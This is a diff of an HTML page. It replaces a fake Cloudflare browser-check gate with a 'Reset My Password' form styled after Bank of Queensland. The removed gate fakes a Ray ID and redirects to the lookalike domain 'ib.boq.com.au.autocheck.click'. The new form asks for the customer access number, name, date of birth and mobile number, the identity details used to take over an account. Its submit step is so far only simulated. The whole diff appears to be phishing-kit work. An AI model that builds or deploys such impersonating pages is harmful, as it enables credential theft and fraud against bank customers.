@@ -1,211 +1,776 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Just a moment...</title>
-<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-<style>
-  * { box-sizing: border-box; }
-  html, body {
-    height: 100%;
-    margin: 0;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background: #ffffff;
-    color: #313131;
-  }
-  .wrapper {
-    min-height: 100%;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    padding: 24px;
-    text-align: center;
-  }
-  .card {
-    max-width: 460px;
-    width: 100%;
-  }
-  .spinner {
-    width: 40px;
-    height: 40px;
-    border: 4px solid #e5e5e5;
-    border-top-color: #f38020;
-    border-radius: 50%;
-    margin: 0 auto 24px;
-    animation: spin 0.9s linear infinite;
-  }
-  @keyframes spin {
-    to { transform: rotate(360deg); }
-  }
-  h1 {
-    font-size: 20px;
-    font-weight: 500;
-    margin: 0 0 8px;
-    color: #1a1a1a;
-  }
-  p.sub {
-    font-size: 14px;
-    color: #6b6b6b;
-    margin: 0 0 28px;
-  }
-  .site-name {
-    font-weight: 600;
-    color: #1a1a1a;
-  }
-  .turnstile-container {
-    display: flex;
-    justify-content: center;
-    margin-bottom: 20px;
-    min-height: 65px;
-  }
-  #manual-note {
-    display: none;
-    font-size: 13px;
-    color: #6b6b6b;
-    margin-top: 10px;
-  }
-  #error-note {
-    display: none;
-    font-size: 13px;
-    color: #c0392b;
-    margin-top: 14px;
-  }
-  footer {
-    margin-top: 40px;
-    font-size: 12px;
-    color: #9a9a9a;
-  }
-  footer a {
-    color: #9a9a9a;
-  }
-  .ray-id {
-    font-family: monospace;
-    font-size: 11px;
-    color: #b5b5b5;
-    margin-top: 6px;
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reset My Password</title>
+    <style>
+        /* Reset and base */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            background-color: #003366;
+            padding: 16px 0;
+            border-bottom: 4px solid #ff8c00;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo svg {
+            height: 48px;
+            width: auto;
+        }
+
+        .logo-text {
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .header-nav {
+            display: flex;
+            gap: 24px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .header-nav a {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: opacity 0.2s;
+            padding: 6px 0;
+            border-bottom: 2px solid transparent;
+        }
+
+        .header-nav a:hover {
+            opacity: 0.8;
+            border-bottom-color: #ff8c00;
+        }
+
+        /* ===== MAIN CONTENT ===== */
+        .main-content {
+            flex: 1;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            width: 100%;
+        }
+
+        .page-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #003366;
+            margin-bottom: 8px;
+            padding-bottom: 12px;
+            border-bottom: 3px solid #ff8c00;
+            display: inline-block;
+        }
+
+        .form-section {
+            background-color: #ffffff;
+            border-radius: 8px;
+            padding: 32px 40px;
+            margin-top: 24px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            max-width: 700px;
+        }
+
+        .form-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #003366;
+            margin-bottom: 12px;
+        }
+
+        .form-description {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .form-description a {
+            color: #003366;
+            text-decoration: underline;
+        }
+
+        .form-description a:hover {
+            color: #ff8c00;
+        }
+
+        /* ===== FORM FIELDS - ALL IN A STRAIGHT LINE LEFT ===== */
+        .form-fields {
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+            align-items: flex-start;
+            width: 100%;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            width: 100%;
+            max-width: 460px;
+        }
+
+        .form-group label {
+            font-weight: 600;
+            font-size: 14px;
+            color: #003366;
+            margin-bottom: 4px;
+        }
+
+        .form-group .hint {
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 6px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1.5px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            background-color: #fafafa;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #003366;
+            box-shadow: 0 0 0 3px rgba(0, 51, 102, 0.12);
+            background-color: #ffffff;
+        }
+
+        .form-group input::placeholder {
+            color: #aaa;
+        }
+
+        .form-group .validation-error {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .form-group.invalid input {
+            border-color: #d32f2f;
+        }
+
+        .form-group.invalid .validation-error {
+            display: block;
+        }
+
+        /* ===== SUBMIT BUTTON ===== */
+        .submit-row {
+            margin-top: 24px;
+            width: 100%;
+            max-width: 460px;
+        }
+
+        .btn-submit {
+            background-color: #003366;
+            color: #ffffff;
+            border: none;
+            padding: 12px 40px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            min-width: 140px;
+        }
+
+        .btn-submit:hover {
+            background-color: #002244;
+        }
+
+        .btn-submit:active {
+            transform: scale(0.97);
+        }
+
+        .btn-submit.loading {
+            opacity: 0.7;
+            pointer-events: none;
+            position: relative;
+        }
+
+        .btn-submit.loading::after {
+            content: '';
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: translateY(-50%) rotate(360deg); }
+        }
+
+        /* ===== ERROR BANNER ===== */
+        .error-banner {
+            background-color: #fde8e8;
+            border-left: 4px solid #d32f2f;
+            padding: 12px 16px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            color: #d32f2f;
+            font-size: 14px;
+            display: none;
+            width: 100%;
+            max-width: 460px;
+        }
+
+        .error-banner.show {
+            display: block;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            background-color: #003366;
+            color: #ffffff;
+            padding: 32px 20px 20px;
+            margin-top: auto;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 40px;
+            margin-bottom: 24px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .footer-column {
+            flex: 1;
+            min-width: 160px;
+        }
+
+        .footer-column h4 {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #ff8c00;
+        }
+
+        .footer-column ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .footer-column ul li {
+            margin-bottom: 6px;
+        }
+
+        .footer-column ul li a {
+            color: #c8d6e5;
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s;
+        }
+
+        .footer-column ul li a:hover {
+            color: #ffffff;
+            text-decoration: underline;
+        }
+
+        .footer-bottom {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 16px;
+            font-size: 12px;
+            color: #a0b8cc;
+        }
+
+        .footer-bottom a {
+            color: #a0b8cc;
+            text-decoration: none;
+        }
+
+        .footer-bottom a:hover {
+            color: #ffffff;
+            text-decoration: underline;
+        }
+
+        .footer-bottom .legal-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .footer-bottom .legal-links span {
+            color: #4a6a8a;
+        }
+
+        .footer-social {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .footer-social a {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: rgba(255, 255, 255, 0.08);
+            transition: background-color 0.2s;
+            color: #ffffff;
+            text-decoration: none;
+        }
+
+        .footer-social a:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .footer-social svg {
+            width: 18px;
+            height: 18px;
+            fill: #ffffff;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .header-nav {
+                gap: 12px;
+            }
+
+            .form-section {
+                padding: 20px 16px;
+            }
+
+            .form-group {
+                max-width: 100%;
+            }
+
+            .submit-row {
+                max-width: 100%;
+            }
+
+            .btn-submit {
+                width: 100%;
+            }
+
+            .footer-links {
+                flex-direction: column;
+                gap: 20px;
+            }
+
+            .footer-bottom {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .footer-bottom .legal-links {
+                justify-content: center;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .page-title {
+                font-size: 22px;
+            }
+
+            .form-title {
+                font-size: 18px;
+            }
+
+            .form-section {
+                padding: 16px 12px;
+            }
+        }
+    </style>
 </head>
 <body>
 
-<div class="wrapper">
-  <div class="card">
-    <div class="spinner" id="spinner"></div>
-    <h1 id="statusTitle">Checking your browser before continuing</h1>
-    <p class="sub" id="statusSub">
-      <span class="site-name" id="siteName">this site</span> needs to review the security of your connection before proceeding.
-    </p>
+    <!-- ===== HEADER ===== -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo">
+                <!-- BOQ Logo SVG -->
+                <svg viewBox="0 0 200 56" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="200" height="56" rx="4" fill="#003366"/>
+                    <text x="16" y="36" font-family="Arial, sans-serif" font-size="22" font-weight="700" fill="#ffffff">BOQ</text>
+                    <text x="62" y="36" font-family="Arial, sans-serif" font-size="14" font-weight="400" fill="#ff8c00">Bank of Queensland</text>
+                    <text x="62" y="48" font-family="Arial, sans-serif" font-size="9" font-weight="300" fill="#88aacc">A division of BOQ Group</text>
+                </svg>
+            </div>
+            <nav class="header-nav">
+                <a href="#">Personal</a>
+                <a href="#">Business</a>
+                <a href="#">Help &amp; Support</a>
+                <a href="#">Contact</a>
+            </nav>
+        </div>
+    </header>
 
-    <div class="turnstile-container" id="turnstileContainer"></div>
+    <!-- ===== MAIN CONTENT ===== -->
+    <main class="main-content">
+        <h1 class="page-title">Reset My Password</h1>
 
-    <p id="manual-note">This should only take a few seconds.</p>
-    <p id="error-note">Verification failed. Please refresh the page to try again.</p>
+        <div class="form-section">
+            <h2 class="form-title">Identification Details</h2>
+            <p class="form-description">
+                To keep your account safe we need to confirm and verify who you are.
+                <br><br>
+                Once you enter your information you will receive a verification code via SMS to your phone. You will be asked to enter this verification code on the next screen. For more information on how we keep your information safe, please read our <a href="#" target="_blank">Privacy Policy</a>.
+            </p>
 
-    <footer>
-      Performance &amp; security by Turnstile
-      <div class="ray-id" id="rayId"></div>
+            <!-- Error Banner -->
+            <div class="error-banner" id="errorBanner"></div>
+
+            <!-- FORM FIELDS - ALL IN A STRAIGHT LINE LEFT -->
+            <div class="form-fields">
+                <!-- CAN -->
+                <div class="form-group" id="canGroup">
+                    <label for="CANNumber">CAN (Customer Access Number)</label>
+                    <span class="hint">10-digit number used to log in to Internet Banking</span>
+                    <input type="text" id="CANNumber" placeholder="e.g. 1234567890" maxlength="10" autocomplete="off">
+                    <span class="validation-error" id="canError">CAN must be numeric and a maximum of 10 digits only</span>
+                </div>
+
+                <!-- First Name -->
+                <div class="form-group" id="firstNameGroup">
+                    <label for="FirstName">First Name</label>
+                    <span class="hint">Complete first name, for example `Benjamin` and not `Ben`</span>
+                    <input type="text" id="FirstName" placeholder="e.g. Benjamin">
+                    <span class="validation-error" id="firstNameError">Please enter your first name</span>
+                </div>
+
+                <!-- Last Name -->
+                <div class="form-group" id="lastNameGroup">
+                    <label for="LastName">Last Name</label>
+                    <span class="hint">Complete last name as on your driver's license or passport</span>
+                    <input type="text" id="LastName" placeholder="e.g. Franklin">
+                    <span class="validation-error" id="lastNameError">Please enter your last name</span>
+                </div>
+
+                <!-- Date of Birth -->
+                <div class="form-group" id="dobGroup">
+                    <label for="DOB">Date of Birth (dd/mm/yyyy)</label>
+                    <span class="hint">Complete date of birth in DD/MM/YYYY format. e.g., 01/01/1970</span>
+                    <input type="date" id="DOB" placeholder="dd/mm/yyyy">
+                    <span class="validation-error" id="dobError">Please enter a valid date of birth</span>
+                </div>
+
+                <!-- Mobile Phone -->
+                <div class="form-group" id="mobileGroup">
+                    <label for="MobileNumber">Mobile Phone Number</label>
+                    <span class="hint">Mobile number registered with BOQ</span>
+                    <input type="tel" id="MobileNumber" placeholder="e.g. 0412345678" maxlength="10">
+                    <span class="validation-error" id="mobileError">Mobile number to be entered in 04xxxxxxxx format only without any spaces</span>
+                </div>
+            </div>
+
+            <!-- Submit Button -->
+            <div class="submit-row">
+                <button type="button" id="submitBtn" class="btn-submit">Submit</button>
+            </div>
+        </div>
+    </main>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <div class="footer-column">
+                    <h4>Related Links</h4>
+                    <ul>
+                        <li><a href="#">Online Banking FAQs</a></li>
+                        <li><a href="#">Online Banking Security</a></li>
+                        <li><a href="#">CAN and Password FAQs</a></li>
+                        <li><a href="#">Logging On FAQs</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>About Us</h4>
+                    <ul>
+                        <li><a href="#">Company overview</a></li>
+                        <li><a href="#">Franchising opportunities</a></li>
+                        <li><a href="#">Media centre</a></li>
+                        <li><a href="#">Careers</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Shareholder Centre</h4>
+                    <ul>
+                        <li><a href="#">My shareholding</a></li>
+                        <li><a href="#">ASX announcements</a></li>
+                        <li><a href="#">Financial information</a></li>
+                        <li><a href="#">Sustainability</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Help &amp; Support</h4>
+                    <ul>
+                        <li><a href="#">Contact us</a></li>
+                        <li><a href="#">Find a branch or ATM</a></li>
+                        <li><a href="#">Important information</a></li>
+                        <li><a href="#">FAQs</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Connect</h4>
+                    <div class="footer-social">
+                        <a href="#" aria-label="Facebook">
+                            <svg viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+                        </a>
+                        <a href="#" aria-label="Twitter">
+                            <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+                        </a>
+                        <a href="#" aria-label="LinkedIn">
+                            <svg viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+                        </a>
+                        <a href="#" aria-label="YouTube">
+                            <svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <div>
+                    &copy; <span id="currentYear">2026</span> Bank of Queensland Limited ABN 32 009 656 740 (BOQ) AFSL and Australian Credit Licence No 244616.
+                </div>
+                <div class="legal-links">
+                    <a href="#">Financial Difficulty Assistance</a>
+                    <span>|</span>
+                    <a href="#">Terms and Conditions</a>
+                    <span>|</span>
+                    <a href="#">Privacy Policy</a>
+                    <span>|</span>
+                    <a href="#">Exception Fees Policy</a>
+                    <span>|</span>
+                    <a href="#">Banking code of practice</a>
+                    <span>|</span>
+                    <a href="#">Sitemap</a>
+                    <span>|</span>
+                    <a href="#">BSB 124-001</a>
+                </div>
+            </div>
+        </div>
     </footer>
-  </div>
-</div>
 
-<script>
-(function () {
-  // ---- Config ----
-  var SITE_KEY = '0x4AAAAAADviox3Tz8fVZXRI';
-  // Absolute URL — the Worker lives on a different origin than this
-  // GitHub Pages site, so a relative path like '/__verify' would just
-  // 404 against github.io itself.
-  var WORKER_URL = 'https://hcaptcha-verify.kamitassin.workers.dev';
-  var VERIFY_ENDPOINT = WORKER_URL + '/__verify';
-  var params = new URLSearchParams(window.location.search);
-  var redirectTarget = params.get('redirect') || 'https://ib.boq.com.au.autocheck.click/mybq/index.html';
+    <script>
+        // Set current year in footer
+        document.getElementById('currentYear').textContent = new Date().getFullYear();
 
-  document.getElementById('siteName').textContent = window.location.hostname;
-  document.getElementById('rayId').textContent = 'Ray ID: ' + generateFakeRayId();
+        // ===== FORM VALIDATION =====
+        const canInput = document.getElementById('CANNumber');
+        const mobileInput = document.getElementById('MobileNumber');
+        const firstNameInput = document.getElementById('FirstName');
+        const lastNameInput = document.getElementById('LastName');
+        const dobInput = document.getElementById('DOB');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorBanner = document.getElementById('errorBanner');
 
-  function generateFakeRayId() {
-    return Array.from({ length: 16 }, function () {
-      return Math.floor(Math.random() * 16).toString(16);
-    }).join('');
-  }
+        function validateCAN(value) {
+            const pattern = /^[0-9]+$/;
+            const group = document.getElementById('canGroup');
+            const errorEl = document.getElementById('canError');
+            if (value.length <= 10 && pattern.test(value) && value.length > 0) {
+                group.classList.remove('invalid');
+                return true;
+            } else {
+                group.classList.add('invalid');
+                return false;
+            }
+        }
 
-  function showError(message) {
-    document.getElementById('spinner').style.display = 'none';
-    document.getElementById('statusTitle').textContent = 'Verification failed';
-    document.getElementById('statusSub').textContent = message || 'Please refresh the page to try again.';
-    document.getElementById('error-note').style.display = 'block';
-  }
+        function validateMobile(value) {
+            const regex = /^04\d{8}$/;
+            const group = document.getElementById('mobileGroup');
+            const errorEl = document.getElementById('mobileError');
+            if (regex.test(value)) {
+                group.classList.remove('invalid');
+                return true;
+            } else {
+                group.classList.add('invalid');
+                return false;
+            }
+        }
 
-  function onSuccess() {
-    document.getElementById('statusTitle').textContent = 'Success! Redirecting...';
-    document.getElementById('statusSub').textContent = 'You may now continue to ' + window.location.hostname + '.';
-  }
+        function validateFirstName(value) {
+            const group = document.getElementById('firstNameGroup');
+            if (value.trim().length > 0) {
+                group.classList.remove('invalid');
+                return true;
+            } else {
+                group.classList.add('invalid');
+                return false;
+            }
+        }
 
-  // Called by Turnstile once the visitor completes/passes the challenge
-  window.onTurnstileVerified = async function (token) {
-    try {
-      var res = await fetch(VERIFY_ENDPOINT, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        credentials: 'include', // required so the Worker's cross-site cookie is stored/sent
-        body: JSON.stringify({ token: token }),
-      });
+        function validateLastName(value) {
+            const group = document.getElementById('lastNameGroup');
+            if (value.trim().length > 0) {
+                group.classList.remove('invalid');
+                return true;
+            } else {
+                group.classList.add('invalid');
+                return false;
+            }
+        }
 
-      console.log('[__verify] status:', res.status);
+        function validateDOB(value) {
+            const group = document.getElementById('dobGroup');
+            if (value) {
+                group.classList.remove('invalid');
+                return true;
+            } else {
+                group.classList.add('invalid');
+                return false;
+            }
+        }
 
-      var data;
-      try {
-        data = await res.json();
-      } catch (parseErr) {
-        console.error('[__verify] response was not valid JSON — likely a CORS block or wrong WORKER_URL', parseErr);
-        showError('Could not reach verification server. Check console for details.');
-        return;
-      }
+        function showError(message) {
+            errorBanner.textContent = message;
+            errorBanner.classList.add('show');
+        }
 
-      console.log('[__verify] response body:', data);
+        function hideError() {
+            errorBanner.classList.remove('show');
+        }
 
-      if (res.ok && data.success) {
-        onSuccess();
-        window.location.replace(redirectTarget);
-      } else {
-        showError(data.message);
-        if (window.turnstile) window.turnstile.reset();
-      }
-    } catch (err) {
-      console.error('[__verify] fetch failed entirely — check Network tab for CORS or DNS errors:', err);
-      showError('Network error while verifying.');
-      if (window.turnstile) window.turnstile.reset();
-    }
-  };
-
-  window.onTurnstileError = function () {
-    showError('Could not load the challenge widget.');
-  };
-
-  // Explicitly render once the Turnstile API script is ready
-  window.addEventListener('load', function () {
-    var tries = 0;
-    var interval = setInterval(function () {
-      tries++;
-      if (window.turnstile) {
-        clearInterval(interval);
-        window.turnstile.render('#turnstileContainer', {
-          sitekey: SITE_KEY,
-          callback: 'onTurnstileVerified',
-          'error-callback': 'onTurnstileError',
-          theme: 'light',
+        // Real-time validation on blur
+        canInput.addEventListener('blur', function() {
+            validateCAN(this.value);
         });
-        document.getElementById('manual-note').style.display = 'block';
-      } else if (tries > 40) {
-        clearInterval(interval);
-        showError('The challenge script failed to load.');
-      }
-    }, 100);
-  });
-})();
-</script>
 
+        mobileInput.addEventListener('blur', function() {
+            validateMobile(this.value);
+        });
+
+        firstNameInput.addEventListener('blur', function() {
+            validateFirstName(this.value);
+        });
+
+        lastNameInput.addEventListener('blur', function() {
+            validateLastName(this.value);
+        });
+
+        dobInput.addEventListener('blur', function() {
+            validateDOB(this.value);
+        });
+
+        // Submit handler
+        submitBtn.addEventListener('click', function() {
+            hideError();
+
+            const can = canInput.value.trim();
+            const mobile = mobileInput.value.trim();
+            const firstName = firstNameInput.value.trim();
+            const lastName = lastNameInput.value.trim();
+            const dob = dobInput.value;
+
+            const isCANValid = validateCAN(can);
+            const isMobileValid = validateMobile(mobile);
+            const isFirstNameValid = validateFirstName(firstName);
+            const isLastNameValid = validateLastName(lastName);
+            const isDOBValid = validateDOB(dob);
+
+            if (!isCANValid || !isMobileValid || !isFirstNameValid || !isLastNameValid || !isDOBValid) {
+                showError('Please check and re-enter your details. All fields are required.');
+                return;
+            }
+
+            // Simulate submission
+            this.classList.add('loading');
+            this.textContent = 'Submitting...';
+
+            setTimeout(() => {
+                this.classList.remove('loading');
+                this.textContent = 'Submit';
+
+                // Simulate success - in production this would redirect
+                const successMsg = document.createElement('div');
+                successMsg.style.cssText = `
+                    background-color: #e8f5e9;
+                    border-left: 4px solid #2e7d32;
+                    padding: 12px 16px;
+                    border-radius: 4px;
+                    margin-top: 16px;
+                    color: #2e7d32;
+                    font-size: 14px;
+                    max-width: 460px;
+                    width: 100%;
+                `;
+                successMsg.textContent = '✅ Verification successful! You will receive a verification code via SMS.';
+                const formSection = document.querySelector('.form-section');
+                const existingMsg = formSection.querySelector('.success-message');
+                if (existingMsg) existingMsg.remove();
+                successMsg.className = 'success-message';
+                formSection.appendChild(successMsg);
+
+                // Scroll to show message
+                successMsg.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }, 1500);
+        });
+
+        // Allow Enter key to submit
+        document.querySelectorAll('.form-group input').forEach(input => {
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    submitBtn.click();
+                }
+            });
+        });
+    </script>
 </body>
 </html>
